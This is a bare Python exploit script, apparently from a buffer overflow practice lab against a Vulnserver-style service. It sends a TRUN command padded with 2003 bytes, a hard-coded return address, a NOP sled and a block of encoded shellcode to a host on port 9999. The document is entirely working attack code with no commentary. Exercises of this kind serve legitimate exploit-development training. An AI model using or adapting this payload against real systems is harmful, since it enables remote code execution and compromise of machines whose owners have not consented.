import sys, socket

overflow = (b"\xd9\xca\xb8\x1c\x56\xf8\xbd\xd9\x74\x24\xf4\x5b\x29\xc9"
b"\xb1\x52\x31\x43\x17\x83\xeb\xfc\x03\x5f\x45\x1a\x48\xa3"
b"\x81\x58\xb3\x5b\x52\x3d\x3d\xbe\x63\x7d\x59\xcb\xd4\x4d"
b"\x29\x99\xd8\x26\x7f\x09\x6a\x4a\xa8\x3e\xdb\xe1\x8e\x71"
b"\xdc\x5a\xf2\x10\x5e\xa1\x27\xf2\x5f\x6a\x3a\xf3\x98\x97"
b"\xb7\xa1\x71\xd3\x6a\x55\xf5\xa9\xb6\xde\x45\x3f\xbf\x03"
b"\x1d\x3e\xee\x92\x15\x19\x30\x15\xf9\x11\x79\x0d\x1e\x1f"
b"\x33\xa6\xd4\xeb\xc2\x6e\x25\x13\x68\x4f\x89\xe6\x70\x88"
b"\x2e\x19\x07\xe0\x4c\xa4\x10\x37\x2e\x72\x94\xa3\x88\xf1"
b"\x0e\x0f\x28\xd5\xc9\xc4\x26\x92\x9e\x82\x2a\x25\x72\xb9"
b"\x57\xae\x75\x6d\xde\xf4\x51\xa9\xba\xaf\xf8\xe8\x66\x01"
b"\x04\xea\xc8\xfe\xa0\x61\xe4\xeb\xd8\x28\x61\xdf\xd0\xd2"
b"\x71\x77\x62\xa1\x43\xd8\xd8\x2d\xe8\x91\xc6\xaa\x0f\x88"
b"\xbf\x24\xee\x33\xc0\x6d\x35\x67\x90\x05\x9c\x08\x7b\xd5"
b"\x21\xdd\x2c\x85\x8d\x8e\x8c\x75\x6e\x7f\x65\x9f\x61\xa0"
b"\x95\xa0\xab\xc9\x3c\x5b\x3c\x36\x68\x62\xd8\xde\x6b\x64"
b"\x31\x43\xe5\x82\x5b\x6b\xa3\x1d\xf4\x12\xee\xd5\x65\xda"
b"\x24\x90\xa6\x50\xcb\x65\x68\x91\xa6\x75\x1d\x51\xfd\x27"
b"\x88\x6e\x2b\x4f\x56\xfc\xb0\x8f\x11\x1d\x6f\xd8\x76\xd3"
b"\x66\x8c\x6a\x4a\xd1\xb2\x76\x0a\x1a\x76\xad\xef\xa5\x77"
b"\x20\x4b\x82\x67\xfc\x54\x8e\xd3\x50\x03\x58\x8d\x16\xfd"
b"\x2a\x67\xc1\x52\xe5\xef\x94\x98\x36\x69\x99\xf4\xc0\x95"
b"\x28\xa1\x94\xaa\x85\x25\x11\xd3\xfb\xd5\xde\x0e\xb8\xf6"
b"\x3c\x9a\xb5\x9e\x98\x4f\x74\xc3\x1a\xba\xbb\xfa\x98\x4e"
b"\x44\xf9\x81\x3b\x41\x45\x06\xd0\x3b\xd6\xe3\xd6\xe8\xd7"
b"\x21")

shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 32 + overflow

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.102', 9999))
payload = b'TRUN /.:/' + shellcode
s.send((payload))
s.close()
